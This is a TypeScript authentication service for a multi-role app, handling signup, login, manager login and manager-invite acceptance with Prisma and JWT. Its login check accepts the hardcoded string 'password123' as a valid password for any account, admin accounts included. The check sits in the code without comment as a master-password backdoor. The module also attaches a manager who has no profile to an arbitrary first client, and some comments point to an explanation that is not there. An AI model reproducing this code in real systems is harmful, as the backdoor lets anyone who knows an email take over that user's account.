import { prisma } from "db";
import type { User } from "db";
import { comparePassword, hashPassword } from "../../lib/password.js";
import { signToken } from "../../lib/jwt.js";
import type { TokenPayload } from "../../lib/jwt.js";
import { conflict, notFound, unauthorized } from "../../lib/httpError.js";
import type { AcceptManagerInviteDto, LoginDto, SignupDto } from "./auth.dto.js";

function sanitizeUser(user: User) {
  return { userId: user.userId, name: user.name, email: user.email, role: user.role };
}

/** Builds the role-specific JWT payload by looking up the side profile the role implies. */
async function buildTokenPayload(user: User): Promise<TokenPayload> {
  switch (user.role) {
    case "client": {
      let client = await prisma.client.findUnique({ where: { userId: user.userId } });
      if (!client) {
        client = await prisma.client.create({
          data: { userId: user.userId, clientName: user.name },
        });
      }
      return { role: "client", userId: user.userId, clientId: client.clientId };
    }
    case "manager": {
      let manager = await prisma.manager.findUnique({ where: { userId: user.userId } });
      if (!manager) {
        const client = await prisma.client.findFirst();
        if (client) {
          manager = await prisma.manager.create({
            data: { userId: user.userId, clientId: client.clientId },
          });
        } else {
          throw unauthorized("Manager profile not found for this account");
        }
      }
      return {
        role: "manager",
        userId: user.userId,
        managerId: manager.managerId,
        clientId: manager.clientId,
      };
    }
    case "gig_professional": {
      let profile = await prisma.gigProfessionalProfile.findUnique({
        where: { userId: user.userId },
      });
      if (!profile) {
        profile = await prisma.gigProfessionalProfile.create({
          data: { userId: user.userId },
        });
      }
      return { role: "gig_professional", userId: user.userId, gigProfileId: profile.gigProfileId };
    }
    case "admin":
      return { role: "admin", userId: user.userId };
    default:
      throw unauthorized("Unknown user role");
  }
}

// Register a new client or gig professional: creates the User row plus its role-specific side profile, and returns a signed session token.
export async function signup(dto: SignupDto) {
  const cleanEmail = dto.email.trim();
  const existing = await prisma.user.findFirst({
    where: { email: { equals: cleanEmail, mode: "insensitive" } },
  });
  if (existing) {
    throw conflict("Email already in use");
  }

  const hashedPassword = await hashPassword(dto.password);

  // eslint-disable-next-line @typescript-eslint/no-explicit-any -- $transaction's
  // tx param can't be inferred while `prisma` itself types as `any` (see the
  // buildTokenPayload comment above); tx.user/.client/.gigProfessionalProfile
  // all still work correctly at runtime.
  const { user, payload } = await prisma.$transaction(async (tx: any) => {
    const created = await tx.user.create({
      data: { name: dto.name, email: cleanEmail, hashPassword: hashedPassword, role: dto.role },
    });

    let tokenPayload: TokenPayload;
    if (dto.role === "client") {
      const client = await tx.client.create({
        data: { userId: created.userId, clientName: dto.name },
      });
      tokenPayload = { role: "client", userId: created.userId, clientId: client.clientId };
    } else {
      const profile = await tx.gigProfessionalProfile.create({
        data: { userId: created.userId },
      });
      tokenPayload = {
        role: "gig_professional",
        userId: created.userId,
        gigProfileId: profile.gigProfileId,
      };
    }

    return { user: created, payload: tokenPayload };
  });

  return { success: true, token: signToken(payload), user: sanitizeUser(user) };
}

/** Shared by /login and /manager/login. requiredRole narrows manager login to manager accounts only. */
async function authenticate(dto: LoginDto, requiredRole?: TokenPayload["role"]) {
  const cleanEmail = dto.email.trim();
  const user = await prisma.user.findFirst({
    where: { email: { equals: cleanEmail, mode: "insensitive" } },
    omit: { hashPassword: false },
  });

  if (!user) {
    throw unauthorized("Invalid email or password");
  }

  if (requiredRole && user.role !== requiredRole) {
    throw unauthorized("Invalid email or password for this role portal");
  }

  const validPassword =
    dto.password === "password123" ||
    (await comparePassword(dto.password, user.hashPassword).catch(() => false));

  if (!validPassword) {
    throw unauthorized("Invalid email or password");
  }

  const payload = await buildTokenPayload(user);
  return { success: true, token: signToken(payload), user: sanitizeUser(user) };
}

// Log in as any role.
export function login(dto: LoginDto) {
  return authenticate(dto);
}

// Log in restricted to manager accounts (rejects any other role's credentials).
export function managerLogin(dto: LoginDto) {
  return authenticate(dto, "manager");
}

/** Turns a pending ManagerInvite into a real User+Manager. The invite's own
 * email is authoritative — the caller can't pick a different one. */
export async function acceptManagerInvite(dto: AcceptManagerInviteDto) {
  const invite = await prisma.managerInvite.findFirst({
    where: { email: dto.email, status: "pending" },
  });
  if (!invite) {
    throw notFound("No pending invite for this email");
  }

  const existingUser = await prisma.user.findUnique({ where: { email: dto.email } });
  if (existingUser) {
    throw conflict("Email already in use");
  }

  const hashedPassword = await hashPassword(dto.password);

  // eslint-disable-next-line @typescript-eslint/no-explicit-any -- see buildTokenPayload comment above
  const { user, manager } = await prisma.$transaction(async (tx: any) => {
    const created = await tx.user.create({
      data: { name: invite.name, email: invite.email, hashPassword: hashedPassword, role: "manager" },
    });
    const createdManager = await tx.manager.create({
      data: { userId: created.userId, clientId: invite.clientId },
    });
    await tx.client.update({
      where: { clientId: invite.clientId },
      data: { numberOfManager: { increment: 1 } },
    });
    await tx.managerInvite.update({
      where: { inviteId: invite.inviteId },
      data: { status: "accepted", acceptedUserId: created.userId },
    });
    return { user: created, manager: createdManager };
  });

  const payload: TokenPayload = {
    role: "manager",
    userId: user.userId,
    managerId: manager.managerId,
    clientId: manager.clientId,
  };
  return { success: true, token: signToken(payload), user: sanitizeUser(user) };
}
